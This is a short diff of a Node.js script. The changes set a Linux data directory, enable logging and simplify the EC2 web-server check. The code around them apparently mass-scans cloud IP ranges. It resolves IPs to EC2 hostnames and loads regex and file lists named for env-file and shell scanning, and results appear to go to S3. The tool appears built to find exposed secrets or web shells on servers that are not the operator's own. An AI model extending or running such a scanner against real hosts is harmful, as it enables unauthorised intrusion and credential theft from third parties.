@@ -15,7 +15,7 @@ var axios = require("axios");
 var cheerio = require("cheerio");
 var { S3Client, PutObjectCommand, GetObjectCommand } = require("@aws-sdk/client-s3");
 var APP_DIR = __dirname;
-var DATA_DIR = "C:\\Users\\Administrator\\Desktop\\new_script\\app";
+var DATA_DIR = "/app";
 var packCfg = {};
 try {
   packCfg = require(path.join(APP_DIR, "pack.json"));
@@ -26,7 +26,7 @@ try {
 var patterns = packCfg.APP_REGEX_ENV_SHELL || [];
 var file_envscan = [...new Set(packCfg.file_env_shellscan || [])];
 var file_phpprofile = [...new Set(packCfg.file_phpprofile_shellscan || [])];
-var LOG_ACTIVE = false;
+var LOG_ACTIVE = true;
 var LOG_UPLOAD_INTERVAL = 500 + Math.floor(Math.random() * 300);
 var AWS_S3 = true;
 var BUNNY_STORAGE = false;
@@ -773,7 +773,7 @@ var _dnsFailCnt = 0;
 var _nonEc2Cnt = 0;
 var _tcpFailCnt = 0;
 var _tcpOkCnt = 0;
-async function verifyEc2Webserver(ip, region) {
+async function verifyEc2Webserver(ip) {
   try {
     const hostnames = await dns.promises.reverse(ip);
     const hostname = (hostnames[0] || "").toLowerCase();
@@ -868,7 +868,7 @@ async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum) {
   for (let i = 0; i < myIps.length; i += DNS_WORKERS_EC2) {
     const chunk = myIps.slice(i, i + DNS_WORKERS_EC2);
     const results = await Promise.allSettled(chunk.map(
-      ({ ip, region }) => verifyEc2Webserver(ip, region)
+      ({ ip }) => verifyEc2Webserver(ip)
     ));
     for (const r of results) {
       processed++;
